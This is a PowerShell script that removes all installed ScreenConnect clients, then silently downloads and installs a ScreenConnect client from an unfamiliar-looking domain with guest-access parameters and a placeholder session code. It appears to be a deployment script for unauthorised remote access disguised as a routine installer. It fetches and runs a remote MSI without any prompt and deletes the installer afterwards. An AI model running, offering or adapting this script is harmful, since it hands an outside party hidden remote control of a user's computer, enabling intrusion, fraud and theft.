# Requires PowerShell 5.1+

$ErrorActionPreference = "Stop"

# Remove existing ScreenConnect clients
Write-Host "Removing old ScreenConnect clients..."

$apps = Get-ChildItem `
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" ,
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Where-Object {
        $_.DisplayName -like "ScreenConnect Client*"
    }

foreach ($app in $apps) {
    if ($app.UninstallString -match "\{[A-F0-9\-]+\}") {
        $guid = $matches[0]

        Write-Host "Uninstalling $($app.DisplayName)..."

        Start-Process -FilePath "msiexec.exe" `
            -ArgumentList @("/x", $guid, "/qn", "/norestart") `
            -Wait
    }
}

# Download ScreenConnect installer
$url = "https://sm-sup.scpanelrkashopping.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=NEWWWWWW&c=&c=&c=&c=&c=&c=&c="
$msi = Join-Path $env:TEMP "ScreenConnect.msi"

Write-Host "Downloading..."

Invoke-WebRequest `
    -Uri $url `
    -OutFile $msi `
    -UseBasicParsing

if (!(Test-Path $msi)) {
    throw "Failed to download installer."
}

Write-Host "Installing..."

$process = Start-Process `
    -FilePath "msiexec.exe" `
    -ArgumentList @("/i", $msi, "/qn", "/norestart") `
    -Wait `
    -PassThru

Write-Host "Installer Exit Code: $($process.ExitCode)"

if ($process.ExitCode -ne 0) {
    throw "Installation failed with exit code $($process.ExitCode)"
}

# Cleanup
Remove-Item $msi -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "ScreenConnect installed successfully."
